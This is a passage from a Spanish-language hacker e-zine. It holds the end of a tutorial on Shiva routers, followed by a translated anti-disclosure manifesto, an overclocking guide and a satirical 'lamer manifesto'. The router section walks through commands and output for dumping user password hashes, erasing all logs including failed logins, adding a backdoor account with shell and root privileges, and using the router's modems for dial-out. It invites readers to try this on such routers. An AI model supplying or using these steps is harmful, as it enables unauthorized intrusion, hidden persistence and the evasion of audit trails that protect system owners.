Protocol   Address            Age  Hardware Addr      Type    Interface
Internet   208.xxx.87.6       4m   x0-x0-B0-2x-xx-78  ARPA    Ethernet:IP
Internet   208.xxx.87.4       4m   AA-xx-x4-00-0C-04  ARPA    Ethernet:IP
Internet   208.xxx.87.5       4m   xx-00-04-0x-xD-x4  ARPA    Ethernet:IP
Internet   208.xxx.86.4       10m  AA-x0-04-xx-0C-04  ARPA    Ethernet:IP
Internet   208.xxx.86.40      0m   AA-00-xx-00-x1-04  ARPA    Ethernet:IP
Internet   208.xxx.86.147     4m   00-80-5x-31-xx-Ax  ARPA    Ethernet:IP
Internet   208.xxx.86.145     4m   00-xx-5x-FE-C9-x8  ARPA    Ethernet:IP
Internet   208.xxx.86.200     0m   00-x0-xx-xF-21-C8  ARPA    Ethernet:IP
Internet   208.xxx.86.51      4m   xx-x0-B0-01-36-3x  ARPA    Ethernet:IP

Aquφ vemos las mßquinas de la red con su IP y su correspondiente direcci≤n
MAC.

Bueno hemos comentado antes que el comando clear nos serß de bastante utili-
dad ya que poniendo "clear log" borrarß todos los logs incluso los logins fa-
llidos. Otro comando que nos servirß de mucho serß configure, con el entramos
en una sesi≤n de configuraci≤n donde podremos a±adir un usuario con los permi
sos q queramos, pero antes de hacer esto vamos a ver la configuraci≤n de los
otros usuarios por si acaso substituyeras una cuenta ya existente:

Shiva#> show security &lt;enter>

[UserOptions]
PWAttempts=0
ARARoamingDelimiter=@
ExpireDays=30
GraceLogins=6

[Users]
admin=/di/do/rt/pw/sh/pwd=hH8FU4gBxJNMMRQ0yhj5ILUbaS/ml=3/fail=1/time=425
jsmith=/di/pw/pwd=.b9BJFBhuA1vuqFa9s8KBlxmngZ/ml=2/time=897646052
mjones=/di/pw/pwd=kRaOhlyT7CKMBldLVBVbektbCE/ml=2/fail=5/time=897646052
user911=/di/pw/pwd=7Xkq8TOwB4juRI51OHkDVVos8S/ml=2/time=910919159
another=/di/pw/pwd=YhzD6KBUB7Lh2iKKKSWxuR0gx7S/ml=2/fail=7/time=90767094|9
jadmams=/di/pw/pwd=ET0OhPyT7CyMBldLLKVbektbCE/ml=2/time=902262821
msmith=/di/pw/pwd=sDV1Jxo8QJncIRcl9eoVO6SKBE/ml=2/time=897646052
dsmith=/di/pw/pwd=pv8OhPyT45CyMBldLSKVbektbCE/ml=2/time=897646052

Como vemos nos muestra las opciones de los usuarios sus privilegios passwords
y demßs que hay en el sistema. Como ves el admin tiene su propia cuenta. Los
usuarios tienen cuentas que permiten conexiones desde terminales, pero no re-
motas. Los passwords salen encriptados en 3DES (Triple DES). Los permisos del
usuario vienen dados despues del login como admin=/di/do/rt/pw/sh que mas ade
lante voy a explicar que es y para que sirve cada una.
Bueno ya estamos preparados para hacernos nuestra cuenta, asi que entramos en
una sesi≤n de configuraci≤n:

Shiva#> config &lt;enter>

Enter configuration file lines.  Edit using:
^X, ^U      clear line
^H, DEL     delete one character
^W          delete one word
^R          retype line
Start by entering section header in square brackets []
Finish by entering ^D or ^Z on a new line.
config>

Como vemos nos dice que empezemos poniendo la cabecera de la secci≤n entre
corchetes, como vamos a crear un usurario pondremo [Users] y a continuaci≤n
nuestro usuario:

config> [Users]
config> usuario=di/do/sh/tp/pw
config> &lt;Cntrl+D>
Review configuration changes [y/n]? y
New configuration parameters:
[users]
usuario=/di/do/sh/tp/pw
Modify the existing configuration [y/n]? y
You may need to reboot for all changed parameters to take effect.

Como vemos hemos puesto la cabecera y despues nuestro usuario con sus privile
gios, a continuaci≤n pulsamos Control+D y nos dice que si queremos guardar
los cambios, le decimos que sφ, y ya tenemos nuestro nuevo user listo con el
que podremos establecer conexiones PPP, etc...
Al principio tu cuenta no tendrß password, asi que cuando hagas login por pri
mera vez deberßs ponerte uno, sino tu pass será &lt;enter>.
El modificador /sh significa que puedes conectar a la shell remotamente, /pw
que puedes cambiarte tu propio pass, si quieres ponerte los privilegios de
root ponte tambiΘn /rt. Ahora reconectamos con nuestra cuenta...
Una de las caracterφsticas de los Shiva es que puedes controlar remotamente
una serie de modems del sistema y en la mayorφa de los casos establecer
DIALOUT. Nota: No se puede hacer uploads usando Zmodem o protocolos similares
ademßs tu puedes bajar cosas, pero estate preparado para unos cuantos errores
CRC en la transmisi≤n.
Para conectar a un modem utilizaremos el comando connect:

Shiva#> connect all_ports &lt;enter>

Connecting to Serial2 at 115200 BPS.
Escape character is CTRL-^(30).
Type the escape character followed by C to get back,
or followed by ? to see other options.

Bien, pues ya estamos en linea! Para inicializar el modem pondremos ATZ y pa-
ra llamar a alg·n n·mero de telefono basta con poner ATDTxxxxxxxx donde las x
son los dφgitos del n·mero de telΘfono, para salir del outdial pulsaremos
Control+C.
Otros comandos interesantes del Shiva son:
cping &lt;IP/Host> (Envφa contin·os echos ICMP a un IP/Host)
crashdump (Escribe un error en el log)
detect (Detecta la configuraci≤n de un interfaz)
disable (Desactiva los privilegios de root)
dmc &lt;comando> (Informaci≤n sobre los comandos, escribe "dmc ?" para una lista)
help (Listado de comandos permitidos)
history (Listado de los comandos anteriormente ejecutados)
initialize &lt;comando> (Reinicia parte del sistema)
lan-to-lan &lt;comando> (Conexi≤n LAN-con-LAN)
ping &lt;IP/Host> (envia echo ICMP a un IP/Host)
ppp (Establece una conexi≤n PPP)
quit (Sale de la shell)
reboot (Restea el sistema completo)
route &lt;argumento> (Modifica la tabla de rutado)
rlogin &lt;IP/Host> (Establece una sesi≤n rlogin)
show &lt;comando> (Informaci≤n sobre comandos, escribe "show ?" para una lista)
Nota: "show config" te mostrará todas las configuraciones del sistema, inclu-
yendo servidores DNS, informaci≤n de seguridad, tabla de rutado, etc...

Bueno hasta aquφ hemos llegado creo que ya teneis bastante para aventuraros
con estos divertidos routers ;).

Un Saludo

-------------------------------------------------------------------------------


-------------------------------------------------------------------------------
--/ 6 /--/ Antidisclosure (anti.security.is) /--/  /-----------------------
-------------------------------------------------------------------------------

Nos ponemos serios. Algunos estamos realmente hartos de ver continuamente
titulares en los periodicos "Hacker arrestado tras..." o ver en topics
de canales de irc "http://www.iomolo.com hackeada por mendolo". Yo
personalmente estoy hasta los mismisimos cojones de esta gente. Gente que
se dedica a ir de guais modificando paginas webs de empresas (que a su vez
poseen un administrador de sistemas incompetente, cosa que tambien me pone
de los nervios) para darselas de superhacker, y para colmo la premsa, siempre
morbosa, les sigue el puto rollo. ┐Y que podemos hacer nosotros? ┐Que puede
hacer la gente que realmente se lo curra? Gente que descubre vulnerabilidades,
que programa herramientas... ┐Nada? El texto que viene a continuacion ha sido 
sacado de la web de un movimiento antidisclusire (http://anti.security.is), y
es una traduccion de texto original (en ingles) realizada por Doing. En el
se explica muy bien en que consiste el movimiento antidisclusire y que
se pretende con el. Desde aqui, queremos mandar todo nuestro apoyo a esta 
gente, que esperemos terminen con la kiddie-plaga que se esta producciendo.
Y a ver si, la gente se da cuenta que no basta con hacer...

   $ gcc xpl.c
   $ ./a.out
   # echo "soy hax0r" > index.html

Veamos dicho texto...


   El proposito de este movimiento es asentar una nueva politica de
   anti-divulgacion en las comunidades de seguridad de redes y
   ordenadores. La finalidad no consiste en impedir la divulgacion de
   todo el material relaccionado con la seguridad, en cambio, pretende
   parar la divulgacion de todos los exploits y vulnerabilidades
   desconocidas o no-publicas. En esencia, esto pararia la publicacion de
   todos los materiales privados que permiten a los script kiddies
   comprometer sistemas usando metodos desconocidos.
			
   El movimiento open-source ha sido una herramienta de valor
   incalculable en el mundo de los ordenadores, y todos estamos en deuda
   con el. El Open-source es un concepto maravilloso que deberia existir
   siempre, porque el software educativo, cientifico, y el destinado al
   usurio deberia ser libre y disponible para todo el mundo.

   Los exploits, sin embargo, no encajan en esta categoria. Son como
   municiones, que pasan desde algoritmos criptograficos hasta pistolas
   de mano o misiles, y no deberian ser distribuidos sin el control de
   las restricciones de exportacion, los exploits no deberian ser
   liberados a un publico de varios millones de usuarios en internet. Un
   holocausto digital ocurre cada vez que un exploit aparece en bugtraq,
   y los kids de todo el mundo se lo bajan y atacan a administradores de
   sistemas que no estan preparados. Francamente, la integridad de los
   sistemas mundiales seria mucho mayor cuando los exploits fueran
   mantenidos privados, y no publicados.

   Un error de concepcion muy comun es que si los grupos o individuos
   mantienen sus exploits y secretos de seguridad para ellos mismos,
   ellos llegarian a ser los dominadores de la "escena ilegal", pues los
   incontables sistemas inseguros estarian bajo su control. Nada mas
   lejos de la verdad. Los foros para el intercambio de informacion, como
   Bugtraq, Packetstorm, www.hack.co.za, y vuln-dev han hecho mucho mas
   para da±ar el underground y la red que para ayudarlos.
				 
   Cuantos visitantes ocasionales de estos sitios y listas de seguridad
   no entienden que algunos de los grupos mas prominentes no publicen sus
   hallazgos inmediatamente, pero solo como ultimo recurso en el caso de
   que su codigo sea copiado o llegue a ser obsoleto. Esta es la razon
   por la cual las fechas en las cabeceras de los ficheros a menudo son
   meses o incluso a±os mas antiguas que las fechas de publicacion.

   Otra conclusion equivocada es que si estos grupos no han publicado
   nada en variois meses, es que debe de ser porque no han encontrado
   nada nuevo. El lector normal debe estar enterado de esto.

   No estamos intentando evitar el desarollo de exploits o el auditado de
   codigo fuente. Estamos intentando simplemente evitar que los
   resultados de estos esfuerzos salgan a la luz. Por favor, unete a
   nosotros si te gustaria ver parada la comercializacion y el abuso
   general de la informacion sobre seguridad.

   Gracias.
			

Si bien en 7a69 compartimos esta postura, es solo en parte, pues la 
publicacion de exploits puede ser MUY ilustrativa si se hace un buen uso de 
ellos (cosa que no pasa en la mayoria de los casos) la mejor solucion a esto,
creo yo es publicar exploits que no funcionen, pero en los que leiendo el
codigo pueda llegar a entenderse la base del exploit.

NOTA: Los exploits y DoS, publicados en un futuro por parte de 7a69 no
      funcionaran, asi que no os molesteis a probarlos y tratad de entenderlos
      para poder corregirlos. Alomejor asi, hasta aprendeis algo :-)

-------------------------------------------------------------------------------


-------------------------------------------------------------------------------
--/ 7 /--/ Introduccion al overclocking /--/ IRreick /-------------------------
-------------------------------------------------------------------------------

INTRODUCCI╙N AL OVERCLOCKING by ireick
----------------------------

--INTRODUCCI╙N--

Bueno antes de empezar decir que el prop≤sito de este artφculo es dar una 
introducci≤n al overclocking, iniciar al lector en el tema mediante algo 
de teoria sobre este y un ejemplo real (con foticos y to xD). Para mßs 
informaci≤n sobre este tema simplemente busca en la Red, el nivel de 
informaci≤n disponible sobre este tema es considerable y no tendras problema 
en adquirir, con algo de tiempo, una base solida.

----------------------------
--┐QU╔ ES EL OVERCLOCKING?--
----------------------------

Bueno vamos a ver si mas o menos entre todos conseguimos entender quΘ 
significa esa palabreja :P. Yo dirφa que el overclocking es la tΘcnica
mediante la cual conseguimos que algun componente de nuestro ordenador, 
forzßndolo, aumente su rendimiento.
El overclocking es posible ya que el fabricante crea un modelo de micro y 
despues se somete la producci≤n a unas rigurosas pruebas de funcionamiento y 
cuando un procesador no pasa la prueba para una velocidad pues se pasa a 
probarlo para la velocidad anterior con lo cußl tenemos un margen a la hora 
de forzar el micro, que a veces serß mayor y a veces serß menos (si si tb es
importante tener algo de suerte con el procesador que nos ha tocado :=P)
Continuar esta explicaci≤n diciendo que estß practica como todo tiene sus 
riesgos y el overclocking puede acortar la vida de tu ordenador, eso si, no a 
corto plazo, con lo que el overclocking, es a mi parecer una prßctica mßs que 
aconsejable xD
Asφ pues, es cuesti≤n de tener cuidado, hacer las cosas poco a poco y, 
sobretodo, controlando la temperatura, ya que esta ademßs de fundir los chips,
hace que nuestro ordenador se vuelva inestable ademas de influir en la 
electromigraci≤n que consiste en una reordenaci≤n de los ßtomos debido al 
paso de la electricidad, es decir que los circuitos elΘctricos se ven da±ados 
por el paso de los electrones.
Finalizar diciendo que el overclocking no es ilegal (por si alguno se lo ha 
preguntado ya :P) ya que los componentes que manipulamos lo hemos adquirido, 
son de nuestra propiedad y podemos hacer con ellos lo que queramos, pero ojo! 
porque lo que si perderemos es la garantφa :(


-------------------------------
--OVERCLOCKING DEL PROCESADOR--
-------------------------------

Antes de empezar diremos que hay dos formas de forzar nuestro procesador, una 
es subiendo el bus del sistema y la otra es subiendo el multiplicador, 
evidentemente esto es asφ porque la velocidad del procesador depende de estos 
dos parßmetros (uuu menos mal que lo he aclarado xD).

-->Subiendo el multiplicador: Variando este parßmetro solo conseguimos 
   aumentar la velocidad del procesador con lo cußl el resto del sistema no se 
   ve forzado. Sin embargo este mΘtodo solo nos valdrß en procesadores 
   antiguos (si, si ya ves un pentium classic ya es antiguo xD) ya que los 
   nuevos procesadores (y otros no tan nuevos) tienen el multiplicador fijado 
   con lo cußl solamente nos quedal la posibilidad de subir el bus del 
   sistema o bin quitar estß protecci≤n (AMD roolz). De todos modos en 
   internet puedes encontrar mucha informaci≤n sobre tu procesador, entre esa 
   informaci≤n si el multiplicador estß bloqueado y en ese caso si podemos 
   desbloquearlo y la manera de hacerlo.

-->Subiendo el bus del sistema: Bien, lo primero que hemos de tener presente 
   a la hora de tocar el bus del sistema es que no solo estamos aumentando la 
   velocidad del procesador sino la de todo el sistema. Aquφ es donde juega 
   un papel importante la placa, es conveniente que nuestra placa nos permita
   frecuencias intermedias entre las "standard" 66, 100 y 133 Mhz ya que sino 
   el overclocking se complica.
   Como he dicho antes si subimos la velocidad del bus del sistema estamos 
   forzando el resto del componentes, esto lo vemos perfectamente reflejados 
   en esta tabla:

Bus del sistema:66Mhz 
Bus Agp: 66Mhz-->  1/1 
Bus PCI: 33Mhz-->  1/2 del bus del sistema  
Bus Isa: 8Mhz-->  1/8 del bus del sistema  
Bus Eide (Hdd) 33Mhz-->  1/2 del bus del sistema  
Bus Usb: 48Mhz --> Fijo  

Bus del sistema: 100Mhz  
Bus Agp: 66Mhz --> 2/3 del bus del sistema  
Bus PCI: 33Mhz --> 1/3 del bus del sistema  
Bus Isa: 8Mhz --> 1/12 del bus del sistema 
Bus Eide (Hdd): 33Mhz --> 2/3 del bus del sistema  
Bus Usb: 48Mhz -->  Fijo  

Bus del sistema: 133Mhz  
Bus Agp: 66Mhz --> 1/2 del bus del sistema  
Bus Pci: 33Mhz --> 1/4 del bus del sistema  
Bus Isa: 8Mhz --> 1/16 del bus del sistema  
Bus Eide (Hdd): 33Mhz --> 1/4 del bus del sistema  
Bus Usb: 48Mhz --> Fijo  

Con lo cußl ojo! pq no solo estamos subiendo la velocidad del procesador y es 
importante subir poco a poco para comprobar que el resto de componentes 
soportan las nuevas frecuencias. Eso si como ya habrßs imaginado aumentar la 
frecuencia del sistema no quiere decir solo mayor rendimiento del procesador 
sino del sistema en general ;P

-->Subir el voltaje: En mßs de una ocasi≤n nos encontraremos con que el micro 
se vuelve inestable al forzarlo, para hacer el sistema inestable deberemos 
subir el voltaje, con lo cußl sobrealimentamos el micro, con lo cußl lo 
calentamos mßs, con lo cußl y nuevamente íOJO CON LA TEMPERATURA!. Asφ pues, 
si decidφs subir el voltaje es aconsejable que se haga y teniendo como lφmite
recomendable 0.4 v por encima del voltaje normal.

------------------------------------------
--┐┐INESTABLE DESPU╔S DEL OVERCLOCKING??--
------------------------------------------

Vamos a ver en este apartado las razones por la que nuestro sistema se puede 
haber vuelto inestable despuΘs de haber intentado un overclocking:

-----HEMOS SUBIDO EL BUS DEL SISTEMA

Como ya hemos dicho antes si subimos el bus del sistema estamos forzando 
muchos componentes y el fallo puede tener varias razones:

-->Procesador: Si aqui esta el fallo puede ser debido a dos razones que son 
   demasiada frecuencia en el core o bien demasiada frecuencia en la cache de
   segundo nivel, para comprobarlo prueba a desactivar la cache de segundo 
   nivel desde la bios, si al arrancarlo el sistema es estable es eso lo que 
   falla y llegados a este punto, pues lo mejor es bajar la velocidad :(, si 
   lo que falla por el contrario es el exceso de frecuencia en el core lo 
   podemos solucionar subiendo el voltaje (íatenci≤n, antes ya hemos 
   comentado como hacer esto!). Una tercera raz≤n serφa que la temperatura es 
   demasiado alta, esto no tendria que pasar si has ido controlando la 
   temperatura, pero bueno en este caso tenemos que mejorar la refrigeraci≤n 
   del micro.

-->Memoria: Si es la memoria lo que produce la inestabilidad podemos probar a 
   subir la latencia desde la bios, incluso hay placas que permiten bajar la 
   velocidad de la memoria 33 Mhz.

-->Targeta AGP: Si aqui estß el fallo desde la bios podemos probar a 
   desactivar el modo agp2x o agp4x (dependiendo de q tengamos) o anular el 
   sidebang adressing.

-->El disco duro: Podemos arreglarlo desactivando el modo ULTRADMA lo cußl 
   repercutirß en el rendimiento de nuestro disco duro :(

-->El chipset: Por ahi he leφdo que el chipset tambiΘn puede ser el causante 
   de que nuestro sistema sea inestable, cosa que solucionan subiendo el 
   vcore VIO y metiΘndole un disipador.

-----HEMOS SUBIDO EL MULTIPLICADOR

En este caso lo ·nico que puede fallar es el procesador y en ese caso pues ya 
sabemos que hacer, mejorar su refrigeraci≤n y probar a subir el voltaje.

-----------------
--REFRIGERACI╙N--
-----------------

Bueno como el lector que haya llegado hasta aquφ ya habrß entendido es muy 
importante para el overclocking la refrigeraci≤n tanto del micro como de la 
caja. Vamos a tratar en este punto este tema.

--> Refrigerando el procesador. Es importante una buena refrigeraci≤n del 
    micro evitando asi un sistema inestable o incluso que el micro se queme. 
    Como referencia podemos decir que la temperatura del procesador no 
    deberφa pasar nunca de los 60-65║C, considerßndose estas temperaturas muy 
    altas. Para conseguirlo, vamos a explicar, la refrigeraci≤n mediante el 
    sistema disipador/ventilador. Como ya habras supuesto este sistema se 
    basa en dos componentes:
    
    --El disipador: Sirver para disipar (jodo que explicaci≤n :P) la calor 
      que produce el micro. A la hora de adquirir un disipador hemos de tener 
      en cuentas diferentes aspectos como:

      -El material del disipador: nos hemos de fijar en la conductividad 
       (sobretodo para focos de calor variables) y el calor especφfico del 
       material (sobretodo para focos de calor fijos)

      -El mΘtodo de fabricaci≤n: Siendo recomendable el forjado frφo, el 
       fresado o el laminado en vez de la extrusi≤n (por otra parte el mΘtodo 
       mßs utilizado).

      -La superfφcie: Cußnto mßs superfφcie tenga el disipador mayor 
       intercambio tΘrmico con el aire.

      -El tama±o: Cußnto mßs grande mßs tardara en calentarse, es apropiado q 
       el tama±o sea grande sobretodo si el micro estß sometido a variaciones
       tΘrmicas.

      -Heat Pipes: Como lo que pretendemos es disipar el calor rßpidamente se 
       usa convecci≤n para hacerlo, metiendo una cßmara de gas en el interior 
       y por convecci≤n logramos que el calor se reparta por la superfφcie de 
       la cßmara.
      
      -Por ·ltimo es muy importante la superfφcie de contacto entre el disipa 
       y el micro, cußnto mayor sea mayor sera la cantidad de calor que ceda 
       el micro al disipador. Podemos conseguir una gran superfφcie de 
       contacto gracias a la silicona para semiconducteres.
       
    --El ventilador: Gracias al uso del ventilador la refrigeraci≤n pasarß a 
      ser activa, realizando estos una convecci≤n forzada sobre el disipador. 
      Que esta convecci≤n sea mßs o menos efectiva depende de tres parßmetros:

      -El caudal: o sea se la cantidad de aire por unidad de tiempo que pasa 
       por el ventilador.

      -La superfφcie de intercambio: pues cußnto mayor sea mejor para 
       conseguir asφ evacuar mßs calor.

      -Las turbulencias: que aumentan el rozamiento con el disipador mejorando
       sus prestaciones. Asφ pues evidentemente un ventilador serß mejor 
       cußnto mßs alto sea y mßs dißmetro ·til tenga, cußnto mßs vueltas de 
       por unidad de tiempo y cußnto mßs aire mueva. Estas son las 
       caracterφsticas que tenemos q buscar a la hora de buscar un ventilador 
       (podemos conseguir mayor n·mero de vueltas por unidad de tiempo 
       dependiendo del voltaje a que sometamos el ventilador ;P).

   -->Refrigerando la caja. Es tambiΘn muy importante para el overclocking 
      una adecuada refrigeraci≤n de la caja consiguiendo asφ una temperatura 
      ≤ptima para los diferentes componentes del ordenador. Aquφ simplemente 
      dirΘ que algunas formas de mejorar la refrigeraci≤n de la caja pueden 
      ser:

      -Dejar la caja abierta. Esto no es ninguna teoria, el echo de tener la 
       caja abierta hace que la temperatura del interior, evidentemente 
       descienda unos cußntos grados.

      -El mejor modo de mejorar la ventilaci≤n de la caja, sin embargo, es 
       mediante una entrada de flujo de aire por la parte inferior de la caja 
       (esto es, colocar ventiladores que introduzcan aire por la parte 
       inferior) y una salida del flujo de aire por la parte superior de la 
       caja (esto es, colocar ventiladores que saquen aire por la parte 
       superior de la caja) de forma q el aire q introducimos va desde la 
       parte inferior hasta la superior refrigerando los diferentes 
       componentes a medida q se calienta y es extraφdo por la parte superior.
       La mejor forma de hacer esto es teniendo en cuenta q lo mßs adecuado 
       es q por cada ventilador introduciendo aire hay q tener un ventilador 
       extrayendo aire.

      -Otros aspectos a tener en cuenta a la hora de mejorar la refrigeraci≤n 
       de la caja es que es recomendable q en el interior los cables no esten 
       sueltos formando un tremendo lφo, lo cußl mejorarß el flujo de aire en 
       el interior, es recomendable q la fuente de alimentaci≤n, por ejemplo, 
       no tenga el ventilador sobre el procesador e introduzca aire sino q lo 
       extraiga, etc, etc.

--------------
--┐Y YA EST┴--
--------------

Porsupuesto que no, para nada, como he dicho antes este artφculo solo 
pretendφa ser una introducci≤n al overclocking, hay muchos temas q no se han 
tratado como por ejemplo subir el voltaje de los ventiladores, la 
refrigeraci≤n por agua, las tΘcnicas para desbloquear el multiplicador de los 
nuevos micros y un largo etcΘtera de tΘcnicas y trucos para mejorar nuestra 
mßquina. Para meterse en el mundo del overclocking se invita al lector a 
visitar los links del final :)

--------------
--UN EJEMPLO--
--------------

Pues eso, como todo no iba a ser teoria, ahora vamos a ver un ejemplo de 
overclocking real (uauuu XD), en este caso de una targeta grßfica, de una
vodoo banshee.

A la hora de mejorar nuestra targeta grßfica hemos de tener en cuenta que para
hacerlo podemos subir tanto la velocidad del chip como la velocidad de la 
memoria. Lo mejor es subir ambas, ir combinando las velocidades y no solo 
subir el chip o la memoria :).

Decir que el overclocking de las targetas grßficas se hace mediante software,
es decir, se suben los parßmetros con un programa asφ que vamos allß.

Lo primero es mejorar la refrigeraci≤n de la targeta grßfica, ya que al 
subirla inevitablemente se va a calentar para hacerlo quitamos el peque±o 
disipador que trae y limpiamos la superfφcie del chip con un algod≤n 
humedecido (con alcohol). Ahora le colocamos un disipador-ventilador de 
socket 370 baratito que habφa por ahφ, para colocarlo utilizamos una fina 
capa de silicona para semiconductores y un poco de cuerda (si si, un poco de 
cuerda, pasa algo? xD yo tambiΘn estoy empezando), pero mejor mira las fotos 
para ver como queda:

foto1
foto2

Ahora la colocamos en la caja y nos fijamos en que hemos perdido dos ranuras 
pci :( pero bueno tampoco me hacen fata asφ que en este caso todo va bien :) 
y colocamos un ventilador que le da aire a la targeta de 8 cm (de esos para 
refrigerar la caja ;) ) y la cosa queda mßs o menos asφ.

foto3
foto4

Vaya chapuza ┐no? :P

Pero ahora medimos temperaturas y vayaaa hemos bajado la temperatura del 
chip 20║C y la de la memoria 10.5║C. Pues no estß nada mal ┐no? :)

Pues nada ahora vamos a ver hasta donde llega la targeta. Mi vodoo banshee 
(de maxi gamer) por defecto tiene la velocidad tanto del chip como de la 
memoria a 100 Mhz.

Pues nada instalamos el software que vamos a utilizar para subir la velocidad 
de ambos parßmetros, en este caso hemos utilizado V.Control version 1.30 
beta. Aqui teneis una captura.

foto5

Empezamos y la targeta llega hasta 120 de chip y 120 memoria (hasta aqui 
hemos llegado en intervalos de 5 Mhz subiendo primero el chip y luego la 
memoria), a partir de ahi se bloquea cußndo empezamos a cargar un poco el 
sistema grßfico, y no digamos si se intenta jugar al quake III :P asφ que 
bajamos la velocidad tanto del chip como de la memoria a 117 y la cosa mejora 
pero tras un rato de quake III falla, asφ que la bajamos un poco mas 115 Mhz 
para el chip y la memoria y ahora si es estable como una roca, ni el 
quake III puede con nosotros :). Asφ que decido estrujarla un poco y subo el 
chip a 117 Mhz dejando la memoria a 115 Mhz pero tras un buen rato de 
quake III falla asφ que para asegurar dejamos tanto el chip como el micro a 
115 Mhz, vaya pues no estß mal del todo 15 Mhz mßs de chip y de memoria. 

Al mejorar el sistema grßfico hemos de tener en cuenta que aumentamos el 
rendimiento del sistema a la hora de jugar y el rendimiento del sistema 
globalmente tambiΘn, ya que como imaginarΘis si tengo una vodoo banshee estoy 
utilizando un entorno grßfico :)

---------
--LINKS--
---------

Bueno pues como os imaginareis todo esto no ha salido de mi cabeza, sino que 
es una peque±a introducci≤n que ha salido despuΘs de leer pßginas como las 
siguientes, en las que encontrareis lo que hemos expuesto aqui y muchφsimo 
mßs :)

-InglΘs
http://www.7volts.com
http://www.athlonoc.com
http://www.tomshardware.com
http://www.overclockers.com
http://www.overclockercafe.com
http://www.guru3d.com

-Espa±ol
http://www.rittercorp.cl
http://www.combustion.cjb.net
http://www.occomp.cl
http://www.enxebre.es/hardware
http://www.quakim.com
http://www.ngasis.com
http://www.geocities.com/ocbyshook

NOTA DEL EDITOR: Las fotos mencionadas durante el articulo podran ser vistas 
                 en la pagina de IReick.

		                http://ireick.7a69ezine.org

-------------------------------------------------------------------------------


-------------------------------------------------------------------------------
---/ 8 /--/ El manifiesto del lamer /--/ ^Se7eN^ /-----------------------------
-------------------------------------------------------------------------------

     Hoy han vuelto a mencionarme.

     "El gran hacker ha vuelto ha hacer un take"

     "El hace siempre lo que quiere, íes el jefe de aqui!"

     Malditos estupidos. ┐Creen de verdad que pueden ir en contra mia?

     ┐Te has preguntado alguna vez que le pasa por la cabeza a un lamer?. Soy 
un lamer entra en mi mundo.

     Mi mundo empieza en el irc. He cambiado el nombre a mi script de mIRC y
todos creen que lo he programado desde cero. Ademas, he instalado winlinux que 
solo uso para que todos crean que de verdad soy un lince en este mundo. 
Aprendi a usar el smurf; pobre de aquel que me mande un dcc. Tambien se 
programar, copiando y pegando codigo java que encontre por ahi he hecho que mi 
pagina sea mucho mas vistosa.

     He descubierto algo. Creo que todo el mundo en el chat me admira. Llevo
tanto tiempo aqui que todos me han visto de operador y por eso siempre me
suben. Soy un super hacker del hispano. Los que se conectan a otras redes son 
un os inutiles y les hago un gran favor con mi presencia. Tienen mucha suerte 
de tener a un verdadero elite del hispano a su lado.

     Soy todopoderoso. Puedo expulsarte de la comunidad hacker univers si 
se me antoja. Llevo tanto tiempo aqui que todos me temen. Bueno, casi todos.
He conseguido hacerme amigo de aquellos que realmente dominan este campo. De 
ese modo tengo las espaldas cubiertas.

      No te atrevas a quitar un ban que yo he puesto porque soy mejor que tu, 
no oses a echarme en cara nada porque soy un Gurz. No se nada de hacking pero 
todo el mundo me tiene miedo ┐Crees que eso lo podria conseguir alguien que no 
sea un genio?

      Me gusta aparentar aquello que no soy. Me hace sentir mejor que todos 
me adulen. He conseguido ser alguien importante. ┐Que piensa ahora la sociedad 
que me ha rechazado durante todos estos a±os?

      Si, soy un criminal. Mi crimen es ser egocentrico. ┐Y que?, ┐Quien puede
pararme?, ?Quien osara a desafiarme?, ┐Acaso ha existido alguna vez un Dios 
mayor que yo?.

       Podeis intentar pararme, pero ya tengo amigos en todas partes. Ellos me
apoyaran porque los muy ingenuos creen de verdad en mi. Yo soy su Dios y 
pronto sere el tuyo. ┐caso crees que no podras sucumbir a mi presencia?


Nota del autor:

Aunque parezca surrealista, este texto estß basado en hechos reales. De verdad
hay gente que piensa asφ, puede que tu conozcas a alguno o incluso puede que 
tu seas uno de ellos y ni siquiera lo sepas. Pon remedio a esta situaci≤n 
cuanto antes. Ya hay demasiados incompetentes en este mundo.

Por supuesto distribuye este texto a quien te venga en gana, siempre y cuando
no cambies ni un solo carßcter del mismo :-). Para cualquier crφtica, 
comentario o lo que sea, tienes el email de abajo.
    
  ________________________________________________________________
                                     _____     _____       _   __
  se7en@larebelion.com              / ___/ ___/__  /___   / | / /
                                    \__ \ / _ \ / // _ \ /  |/ /
  http://www.hackersterra.cjb.net  ___/ //  __// //  __// /|  /
                                  /____/ \___//_/ \___//_/ |_/
  ____________________________________________________________2001
       

-------------------------------------------------------------------------------


Bien, ya sabeis que podeis mandarnos un doc, por corto que sea...

                            staff@7a69ezine.org
*EOF*

```

</div>
